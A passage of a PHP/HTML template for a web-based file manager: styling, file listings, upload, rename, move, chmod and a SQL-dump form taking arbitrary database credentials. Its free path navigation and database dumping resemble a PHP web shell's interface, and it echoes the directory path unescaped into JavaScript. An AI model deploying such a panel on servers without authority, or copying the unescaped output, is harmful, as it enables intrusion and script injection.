            z-index: 1000;
            min-width: 180px;
        }
        .context-menu a, .context-menu button {
            display: block;
            padding: 8px 12px;
            color: #e9ecef;
            text-decoration: none;
            font-size: 12px;
            border: none;
            background: none;
            width: 100%;
            text-align: left;
        }
        .context-menu a:hover, .context-menu button:hover {
            background: #3498db;
            color: #fff;
        }
        .context-menu form {
            margin: 0;
        }
        .upload-progress {
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: #2c3e50;
            color: #e9ecef;
            padding: 8px;
            border-radius: 6px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
            z-index: 1000;
            display: none;
            max-width: 250px;
        }
        .upload-progress .progress-item {
            margin-bottom: 8px;
        }
        .upload-progress .progress {
            height: 6px;
            margin-top: 6px;
        }
        .upload-progress button {
            font-size: 10px;
            padding: 2px 6px;
            margin-top: 4px;
            background: #c0392b;
            color: #fff;
            border: none;
            border-radius: 4px;
        }
        .upload-progress button:hover {
            background: #a5281f;
        }
        .modal-content {
            background: #2c3e50;
            color: #e9ecef;
            border-radius: 8px;
        }
        .modal-header, .modal-footer {
            border-color: #4b5e6d;
        }
        .modal-title {
            font-weight: 500;
            font-size: 16px;
        }
        .modal-body input {
            font-size: 12px;
        }
        .modal-body label {
            font-size: 12px;
        }
        .search-results {
            margin-top: 10px;
        }
        .preview-img {
            max-width: 30px;
            max-height: 30px;
            margin-left: 10px;
            border-radius: 4px;
        }
        .grid-view .preview-img {
            max-width: 50px;
            max-height: 50px;
        }
        @media (max-width: 992px) {
            .sidebar {
                position: fixed;
                z-index: 1000;
            }
            .content.active {
                margin-left: 0;
            }
            .menu-toggle {
                display: block;
            }
            .content {
                padding: 10px;
            }
            .header {
                padding: 6px 8px;
            }
            .toolbar {
                gap: 3px;
            }
            .toolbar .btn {
                padding: 4px;
            }
        }
        @media (max-width: 576px) {
            .header {
                flex-direction: row;
                align-items: center;
                gap: 6px;
            }
            .logo {
                font-size: 16px;
            }
            .toolbar {
                flex-wrap: nowrap;
                justify-content: flex-end;
            }
            .toolbar .form-control {
                width: 120px;
            }
            .current-dir {
                flex-direction: row;
                align-items: center;
                gap: 5px;
                font-size: 11px;
            }
            .current-dir a {
                padding: 3px 6px;
                font-size: 11px;
            }
            .table {
                font-size: 14px;
            }
            .table th, .table td {
                padding: 8px;
            }
            .table .size, .table .modified, .table .permissions {
                display: none;
            }
            .table .file-icon {
                font-size: 20px;
            }
            .table.grid-view {
                grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            }
            .table.grid-view .file-icon {
                font-size: 28px;
            }
            .preview-img {
                max-width: 40px;
                max-height: 40px;
            }
            .grid-view .preview-img {
                max-width: 60px;
                max-height: 60px;
            }
        }
        @media (min-width: 993px) {
            .sidebar {
                left: 0;
                position: sticky;
                top: 10px;
                opacity: 1;
            }
            .content {
                margin-left: 220px;
            }
        }
    </style>
</head>
<body>
<div class="container-fluid">
    <div class="header">
        <div class="logo">
            <button class="menu-toggle"><i class="fas fa-bars"></i></button>
            File Manager
        </div>
        <div class="toolbar">
            <form method="post" style="display: inline;">
                <input type="hidden" name="action" value="search">
                <input type="text" name="search_query" id="searchInput" class="form-control d-inline-block" style="width: 150px;" placeholder="Search files..." value="<?= isset($_SESSION['search_query']) ? htmlspecialchars($_SESSION['search_query']) : '' ?>">
                <button type="submit" class="btn btn-secondary btn-sm" title="Search"><i class="fas fa-search"></i></button>
            </form>
            <div class="dropdown">
                <button class="btn btn-secondary btn-sm" type="button" id="actionMenu" data-bs-toggle="dropdown" aria-expanded="false" title="Actions">
                    <i class="fas fa-ellipsis-v"></i>
                </button>
                <ul class="dropdown-menu" aria-labelledby="actionMenu">
                    <form id="actionForm" method="post" style="display: inline;">
                        <input type="hidden" name="action" id="actionInput">
                        <input type="hidden" name="selected[]" id="singleSelect">
                        <li><button type="submit" class="dropdown-item" onclick="setAction('open')" title="Open"><i class="fas fa-folder-open me-2"></i> Open</button></li>
                        <li><button type="submit" class="dropdown-item" onclick="setAction('edit')" title="Edit"><i class="fas fa-edit me-2"></i> Edit</button></li>
                        <li><button type="submit" class="dropdown-item" onclick="setAction('compress')" title="Compress"><i class="fas fa-file-archive me-2"></i> Compress</button></li>
                        <li><button type="submit" class="dropdown-item" onclick="setAction('extract')" title="Extract"><i class="fas fa-file-export me-2"></i> Extract</button></li>
                        <li><button type="submit" class="dropdown-item" onclick="setAction('download')" title="Download"><i class="fas fa-download me-2"></i> Download</button></li>
                        <li><button type="submit" class="dropdown-item" onclick="setAction('delete'); return confirm('Delete selected items?')" title="Delete"><i class="fas fa-trash me-2"></i> Delete</button></li>
                        <li><button type="button" class="dropdown-item" onclick="openModal('rename')" title="Rename"><i class="fas fa-i-cursor me-2"></i> Rename</button></li>
                        <li><button type="button" class="dropdown-item" onclick="openModal('copy')" title="Copy"><i class="fas fa-copy me-2"></i> Copy</button></li>
                        <li><button type="button" class="dropdown-item" onclick="openModal('move')" title="Move"><i class="fas fa-arrows-alt me-2"></i> Move</button></li>
                        <li><button type="button" class="dropdown-item" onclick="openModal('chmod')" title="Permissions"><i class="fas fa-lock me-2"></i> Permissions</button></li>
                    </form>
                    <li><hr class="dropdown-divider" style="border-color: #4b5e6d;"></li>
                    <li>
                        <form method="post" enctype="multipart/form-data" id="uploadForm" style="display: inline;">
                            <input type="hidden" name="action" value="upload">
                            <input type="file" name="file[]" id="uploadInput" multiple style="display: none;" onchange="uploadFiles(this.files)">
                            <button type="button" class="dropdown-item" onclick="document.getElementById('uploadInput').click()" title="Upload"><i class="fas fa-upload me-2"></i> Upload</button>
                        </form>
                    </li>
                    <li><button type="button" class="dropdown-item" onclick="toggleView()" title="Smart View"><i class="fas fa-th me-2"></i> Smart View</button></li>
                </ul>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-md-3 sidebar" id="sidebar">
            <h5><i class="fas fa-folder-open me-2"></i> File Manager</h5>
            <nav class="nav flex-column">
                <a class="nav-link" href="?dir=<?= urlencode($root_dir) ?>"><i class="fas fa-home"></i> My Files</a>
                <a class="nav-link" href="?dir=<?= urlencode($trash_dir) ?>"><i class="fas fa-trash"></i> Trash Bin</a>
                <h5 data-bs-toggle="collapse" data-bs-target="#createNewCollapse" aria-expanded="false" aria-controls="createNewCollapse"><i class="fas fa-plus me-2"></i> Create New</h5>
                <div class="collapse" id="createNewCollapse">
                    <form method="post">
                        <input type="hidden" name="action" value="create_folder">
                        <div class="input-group">
                            <input type="text" name="foldername" class="form-control" placeholder="New Folder" required>
                            <button type="submit" class="btn btn-success"><i class="fas fa-folder-plus"></i></button>
                        </div>
                    </form>
                    <form method="post">
                        <input type="hidden" name="action" value="create_file">
                        <div class="input-group">
                            <input type="text" name="filename" class="form-control" placeholder="New File" required>
                            <button type="submit" class="btn btn-success"><i class="fas fa-file-plus"></i></button>
                        </div>
                    </form>
                </div>
                <h5 data-bs-toggle="collapse" data-bs-target="#sqlDumpCollapse" aria-expanded="false" aria-controls="sqlDumpCollapse"><i class="fas fa-database me-2"></i> SQL Dump</h5>
                <div class="collapse" id="sqlDumpCollapse">
                    <form method="post">
                        <input type="hidden" name="action" value="sqldump">
                        <div class="mb-2">
                            <input type="text" name="host" placeholder="DB Host" class="form-control" required>
                        </div>
                        <div class="mb-2">
                            <input type="text" name="user" placeholder="DB User" class="form-control" required>
                        </div>
                        <div class="mb-2">
                            <input type="text" name="pass" placeholder="DB Password" class="form-control">
                        </div>
                        <div class="mb-2">
                            <input type="text" name="db" placeholder="Database" class="form-control" required>
                        </div>
                        <button type="submit" class="btn btn-warning btn-sm"><i class="fas fa-database me-2"></i> Dump SQL</button>
                    </form>
                </div>
                <a class="nav-link text-danger" href="?logout=1"><i class="fas fa-sign-out-alt"></i> Logout</a>
            </nav>
        </div>
        <div class="col-md-9 content" id="content">
            <?php if ($msg): ?>
                <div class="alert alert-success"><i class="fas fa-check-circle me-2"></i> <?= htmlspecialchars($msg) ?></div>
            <?php endif; ?>

            <div class="current-dir">
                <strong>Directory:</strong>
                <?php
                $parts = explode(DIRECTORY_SEPARATOR, $cwd);
                $path = '';
                echo '<span>';
                foreach ($parts as $part) {
                    if ($part) {
                        $path .= DIRECTORY_SEPARATOR . $part;
                        echo '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a> / ';
                    }
                }
                echo '</span>';
                ?>
                <a class="btn btn-sm btn-secondary" href="?dir=<?= urlencode(dirname($cwd)) ?>"><i class="fas fa-arrow-left"></i></a>
            </div>

            <!-- Search Results -->
            <?php if (isset($_SESSION['search_results'])): ?>
                <div class="search-results">
                    <h5>Search Results for "<?= htmlspecialchars($_SESSION['search_query']) ?>" <a href="?dir=<?= urlencode($cwd) ?>&clear_search=1" class="btn btn-sm btn-secondary">Clear</a></h5>
                    <form id="tableForm" method="post">
                        <input type="hidden" name="action" id="tableActionInput">
                        <table class="table table-bordered table-striped">
                            <thead>
                                <tr>
                                    <th></th>
                                    <th>Name</th>
                                    <th class="size">Path</th>
                                    <th class="size">Size</th>
                                    <th class="modified">Modified</th>
                                    <th class="permissions">Permissions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php foreach ($_SESSION['search_results'] as $result):
                                    $url_item = urlencode(basename($result['path']));
                                    $dir = urlencode(dirname($result['path']));
                                    $extension = strtolower(pathinfo($result['name'], PATHINFO_EXTENSION));
                                    $is_image = in_array($extension, ['jpg', 'jpeg', 'png', 'gif']);
                                ?>
                                <tr data-type="<?= $result['is_dir'] ? 'dir' : 'file' ?>" data-item="<?= htmlspecialchars(basename($result['path'])) ?>" data-url="<?= $result['is_dir'] ? '?dir=' . urlencode($result['path']) : '?dir=' . $dir . '&file=' . $url_item . '&action=edit' ?>">
                                    <td>
                                        <input type="checkbox" name="selected[]" value="<?= htmlspecialchars(basename($result['path'])) ?>" class="select-item" style="display: none;">
                                    </td>
                                    <td>
                                        <?php if ($result['is_dir']): ?>
                                            <a href="?dir=<?= urlencode($result['path']) ?>" style="text-decoration:none; color:#3498db;">
                                                <i class="fas fa-folder file-icon"></i> <?= htmlspecialchars($result['name']) ?>
                                            </a>
                                        <?php else: ?>
                                            <a href="?dir=<?= $dir ?>&file=<?= $url_item ?>&action=edit" style="text-decoration:none; color:#2c3e50;">
                                                <i class="fas fa-file file-icon"></i> <?= htmlspecialchars($result['name']) ?>
                                                <?php if ($is_image): ?>
                                                    <img src="?dir=<?= $dir ?>&file=<?= $url_item ?>&action=preview_image" class="preview-img">
                                                <?php endif; ?>
                                            </a>
                                        <?php endif; ?>
                                    </td>
                                    <td class="size"><?= htmlspecialchars($result['path']) ?></td>
                                    <td class="size"><?= $result['size'] ?></td>
                                    <td class="modified"><?= $result['modified'] ?></td>
                                    <td class="permissions"><?= $result['permissions'] ?></td>
                                </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </form>
                </div>
            <?php else: ?>
                <!-- File/Folder Table -->
                <form id="tableForm" method="post">
                    <input type="hidden" name="action" id="tableActionInput">
                    <?php $items = getSortedItems($cwd); ?>
                    <?php if (empty($items)): ?>
                        <div class="alert alert-info">No files or folders found in this directory.</div>
                    <?php else: ?>
                        <table class="table table-bordered table-striped">
                            <thead>
                                <tr>
                                    <th></th>
                                    <th>Name</th>
                                    <th class="size">Size</th>
                                    <th class="modified">Modified</th>
                                    <th class="permissions">Permissions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php foreach ($items as $item):
                                    $path = $cwd . DIRECTORY_SEPARATOR . $item;
                                    $url_item = urlencode($item);
                                    $is_dir = is_dir($path);
                                    $permissions = substr(sprintf('%o', fileperms($path)), -4);
                                    $extension = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                                    $is_image = in_array($extension, ['jpg', 'jpeg', 'png', 'gif']);
                                ?>
                                <tr data-type="<?= $is_dir ? 'dir' : 'file' ?>" data-item="<?= htmlspecialchars($item) ?>" data-url="<?= $is_dir ? '?dir=' . urlencode($path) : '?dir=' . urlencode($cwd) . '&file=' . $url_item . '&action=edit' ?>">
                                    <td>
                                        <input type="checkbox" name="selected[]" value="<?= htmlspecialchars($item) ?>" class="select-item" style="display: none;">
                                    </td>
                                    <td>
                                        <?php if ($is_dir): ?>
                                            <a href="?dir=<?= urlencode($path) ?>" style="text-decoration:none; color:#3498db;">
                                                <i class="fas fa-folder file-icon"></i> <?= htmlspecialchars($item) ?>
                                            </a>
                                        <?php else: ?>
                                            <a href="?dir=<?= urlencode($cwd) ?>&file=<?= $url_item ?>&action=edit" style="text-decoration:none; color:#2c3e50;">
                                                <i class="fas fa-file file-icon"></i> <?= htmlspecialchars($item) ?>
                                                <?php if ($is_image): ?>
                                                    <img src="?dir=<?= urlencode($cwd) ?>&file=<?= $url_item ?>&action=preview_image" class="preview-img">
                                                <?php endif; ?>
                                            </a>
                                        <?php endif; ?>
                                    </td>
                                    <td class="size"><?= is_file($path) ? filesize($path) . " bytes" : '-' ?></td>
                                    <td class="modified"><?= date("Y-m-d H:i:s", filemtime($path)) ?></td>
                                    <td class="permissions"><?= $permissions ?></td>
                                </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    <?php endif; ?>
                </form>
            <?php endif; ?>
        </div>
    </div>
</div>

<!-- Modals -->
<div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="renameModalLabel">Rename File/Folder</h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <input type="hidden" name="action" value="rename">
                    <input type="hidden" name="selected[]" id="renameSelect">
                    <div class="mb-3">
                        <label for="renameInputModal" class="form-label">New Name</label>
                        <input type="text" name="new" id="renameInputModal" class="form-control" placeholder="Enter new name" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" class="btn btn-primary">Rename</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="copyModal" tabindex="-1" aria-labelledby="copyModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="copyModalLabel">Copy File/Folder</h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <input type="hidden" name="action" value="copy">
                    <input type="hidden" name="selected[]" id="copySelect">
                    <div class="mb-3">
                        <label for="copyInputModal" class="form-label">Destination</label>
                        <input type="text" name="destination" id="copyInputModal" class="form-control" placeholder="Enter destination path" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" class="btn btn-primary">Copy</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="moveModal" tabindex="-1" aria-labelledby="moveModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="moveModalLabel">Move File/Folder</h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <input type="hidden" name="action" value="move">
                    <input type="hidden" name="selected[]" id="moveSelect">
                    <div class="mb-3">
                        <label for="moveInputModal" class="form-label">Destination</label>
                        <input type="text" name="destination" id="moveInputModal" class="form-control" placeholder="Enter destination path" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" class="btn btn-primary">Move</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="chmodModal" tabindex="-1" aria-labelledby="chmod hommesModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="chmodModalLabel">Change Permissions</h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <input type="hidden" name="action" value="chmod">
                    <input type="hidden" name="selected[]" id="chmodSelect">
                    <div class="mb-3">
                        <label for="chmodInputModal" class="form-label">Permissions (e.g., 0755)</label>
                        <input type="text" name="permissions" id="chmodInputModal" class="form-control" placeholder="Enter permissions" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" class="btn btn-primary">Apply</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div id="contextMenu" class="context-menu" style="display: none;">
    <a id="contextOpen" href="#" title="Open"><i class="fas fa-folder-open me-2"></i> Open</a>
    <a id="contextEdit" href="#" title="Edit"><i class="fas fa-edit me-2"></i> Edit</a>
    <a id="contextPreview" href="#" title="Preview"><i class="fas fa-eye me-2"></i> Preview</a>
    <form id="contextActionForm" method="post" style="display: inline;">
        <input type="hidden" name="action" id="contextActionInput">
        <input type="hidden" name="selected[]" id="contextSingleSelect">
        <button type="submit" onclick="setContextAction('compress')" title="Compress"><i class="fas fa-file-archive me-2"></i> Compress</button>
        <button type="submit" onclick="setContextAction('extract')" title="Extract"><i class="fas fa-file-export me-2"></i> Extract</button>
        <button type="submit" onclick="setContextAction('download')" title="Download"><i class="fas fa-download me-2"></i> Download</button>
        <button type="submit" onclick="setContextAction('delete'); return confirm('Delete?')" title="Delete"><i class="fas fa-trash me-2"></i> Delete</button>
        <button type="button" onclick="openContextModal('rename')" title="Rename"><i class="fas fa-i-cursor me-2"></i> Rename</button>
        <button type="button" onclick="openContextModal('copy')" title="Copy"><i class="fas fa-copy me-2"></i> Copy</button>
        <button type="button" onclick="openContextModal('move')" title="Move"><i class="fas fa-arrows-alt me-2"></i> Move</button>
        <button type="button" onclick="openContextModal('chmod')" title="Permissions"><i class="fas fa-lock me-2"></i> Permissions</button>
    </form>
</div>

<div id="uploadProgress" class="upload-progress" style="display: none;"></div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
    let xhrs = [];

    // Sidebar toggle
    document.querySelector('.menu-toggle').addEventListener('click', () => {
        const sidebar = document.getElementById('sidebar');
        const content = document.getElementById('content');
        sidebar.classList.toggle('active');
        content.classList.toggle('active');
    });

    // Close sidebar and context menu on outside click
    document.addEventListener('click', (e) => {
        const sidebar = document.getElementById('sidebar');
        const menuToggle = document.querySelector('.menu-toggle');
        if (!sidebar.contains(e.target) && !menuToggle.contains(e.target) && sidebar.classList.contains('active')) {
            sidebar.classList.remove('active');
            document.getElementById('content').classList.remove('active');
        }
        if (!e.target.closest('.context-menu')) {
            document.getElementById('contextMenu').style.display = 'none';
        }
    });

    // Toolbar action handling
    function setAction(action) {
        const selected = document.querySelectorAll('.select-item:checked');
        if (selected.length === 0) {
            alert('Please select at least one item.');
            return false;
        }
        if (action === 'open' && selected.length > 1) {
            alert('Please select only one folder to open.');
            return false;
        }
        if (action === 'edit' && selected.length > 1) {
            alert('Please select only one file to edit.');
            return false;
        }
        document.getElementById('actionInput').value = action;
        if (selected.length === 1) {
            document.getElementById('singleSelect').value = selected[0].value;
        }
        if (action === 'open') {
            const item = selected[0].value;
            const isDir = selected[0].closest('tr').dataset.type === 'dir';
            if (isDir) {
                window.location.href = `?dir=${encodeURIComponent('<?= $cwd ?>' + '/' + item)}`;
            }
            return false;
        }
        if (action === 'edit') {
            const item = selected[0].value;
            const isDir = selected[0].closest('tr').dataset.type === 'dir';
            if (!isDir) {
                window.location.href = `?dir=<?= urlencode($cwd) ?>&file=${encodeURIComponent(item)}&action=edit`;
            }
            return false;
        }
    }

    // Modal handling
    function openModal(action) {
        const selected = document.querySelectorAll('.select-item:checked');
        if (selected.length === 0) {
            alert('Please select at least one item.');
            return;
        }
        if (action === 'rename' && selected.length > 1) {
            alert('Please select only one item to rename.');
            return;
        }
        if (selected.length === 1) {
            document.getElementById(`${action}Select`).value = selected[0].value;
        }
        const modal = new bootstrap.Modal(document.getElementById(`${action}Modal`));
        modal.show();
    }

    // Context menu action handling
    function setContextAction(action) {
        document.getElementById('contextActionInput').value = action;
    }

    function openContextModal(action) {
        const selected = document.querySelectorAll('.select-item:checked');
        if (selected.length === 0) {
            alert('Please select at least one item.');
            return;
        }
        if (action === 'rename' && selected.length > 1) {
            alert('Please select only one item to rename.');
            return;
        }
        if (selected.length === 1) {
            document.getElementById(`${action}Select`).value = selected[0].value;
        }
        const modal = new bootstrap.Modal(document.getElementById(`${action}Modal`));
        modal.show();
    }

    // Toggle view (list/grid) for Smart View
    let isGridView = false;
    function toggleView() {
        isGridView = !isGridView;
        const table = document.querySelector('.table');
        table.classList.toggle('grid-view', isGridView);
    }

    // Table row handling
    document.querySelectorAll('tbody tr').forEach(tr => {
        // Single click for selection on desktop
        tr.addEventListener('click', (e) => {
            if (window.innerWidth > 576) {
                if (e.target.closest('a, button')) return;
                const checkbox = tr.querySelector('.select-item');
                const icon = tr.querySelector('.file-icon');
                checkbox.checked = !checkbox.checked;
                tr.classList.toggle('selected', checkbox.checked);
                icon.classList.toggle('selected', checkbox.checked);
            }
        });

        // Long press for selection on mobile
        let pressTimer;
        tr.addEventListener('touchstart', (e) => {
            if (window.innerWidth <= 576) {
                pressTimer = setTimeout(() => {
                    const checkbox = tr.querySelector('.select-item');
                    const icon = tr.querySelector('.file-icon');
                    checkbox.checked = !checkbox.checked;
                    tr.classList.toggle('selected', checkbox.checked);
                    icon.classList.toggle('selected', checkbox.checked);
                    showContextMenu(e, tr);
                }, 500);
            }
        });
        tr.addEventListener('touchend', () => {
            clearTimeout(pressTimer);
        });
        tr.addEventListener('touchmove', () => {
            clearTimeout(pressTimer);
        });

        // Double click for edit/open
        tr.addEventListener('dblclick', () => {
            const item = tr.dataset.item;
            const isDir = tr.dataset.type === 'dir';
            const cwd = '<?= urlencode($cwd) ?>';
            const urlItem = encodeURIComponent(item);
            window.location.href = isDir ? `?dir=${encodeURIComponent('<?= $cwd ?>' + '/' + item)}` : `?dir=${cwd}&file=${urlItem}&action=edit`;
        });

        // Right-click/long-press context menu
        tr.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            showContextMenu(e, tr);
        });
    });

    // Show context menu
    function showContextMenu(e, tr) {
        const contextMenu = document.getElementById('contextMenu');
        const item = tr.dataset.item;
        const isDir = tr.dataset.type === 'dir';
        const cwd = '<?= urlencode($cwd) ?>';
        const urlItem = encodeURIComponent(item);

        // Set context menu links
        document.getElementById('contextOpen').href = isDir ? `?dir=${encodeURIComponent('<?= $cwd ?>' + '/' + item)}` : '#';
        document.getElementById('contextOpen').style.display = isDir ? 'block' : 'none';
        document.getElementById('contextEdit').href = isDir ? '#' : `?dir=${cwd}&file=${urlItem}&action=edit`;
        document.getElementById('contextEdit').style.display = isDir ? 'none' : 'block';
        document.getElementById('contextPreview').href = isDir ? '#' : `?dir=${cwd}&file=${urlItem}&action=preview`;
        document.getElementById('contextPreview').style.display = isDir ? 'none' : 'block';
        document.getElementById('contextSingleSelect').value = item;

        // Show context menu
        contextMenu.style.display = 'block';
        contextMenu.style.left = `${e.pageX}px`;
        contextMenu.style.top = `${e.pageY}px`;
    }

    // Drag-and-drop multiple upload
    document.addEventListener('dragover', (e) => {
        e.preventDefault();
    });

    document.addEventListener('drop', (e) => {
        e.preventDefault();
        const files = e.dataTransfer.files;
        uploadFiles(files);
    });

    // Multiple file upload with progress and cancel
    function uploadFiles(files) {
        const uploadProgress = document.getElementById('uploadProgress');
        uploadProgress.style.display = 'block';
        uploadProgress.innerHTML = '';
        for (let i = 0; i < files.length; i++) {
            let formData = new FormData();
            formData.append('action', 'upload');
            formData.append('file[]', files[i]);

            let xhr = new XMLHttpRequest();
            xhrs.push(xhr);
            let index = xhrs.length - 1;

            let progressDiv = document.createElement('div');
            progressDiv.className = 'progress-item';
            progressDiv.innerHTML = `
                <div>${files[i].name}</div>
                <div class="progress">
                    <div class="progress-bar" style="width: 0%;"></div>
                </div>
                <button onclick="xhrs[${index}].abort()">Cancel</button>
            `;
            uploadProgress.appendChild(progressDiv);

            xhr.upload.addEventListener('progress', (e) => {
                if (e.lengthComputable) {
                    let percent = Math.round((e.loaded / e.total) * 100);
                    progressDiv.querySelector('.progress-bar').style.width = `${percent}%`;
                }
            });

            xhr.addEventListener('load', () => {
                progressDiv.remove();
                if (uploadProgress.childNodes.length === 0) {
                    uploadProgress.style.display = 'none';
                    window.location.reload();
                }
            });

            xhr.addEventListener('abort', () => {
                progressDiv.remove();
                if (uploadProgress.childNodes.length === 0) {
                    uploadProgress.style.display = 'none';
                }
            });

            xhr.open('POST', '?dir=<?= urlencode($cwd) ?>', true);
            xhr.send(formData);
        }
    }
</script>
</body>
</html>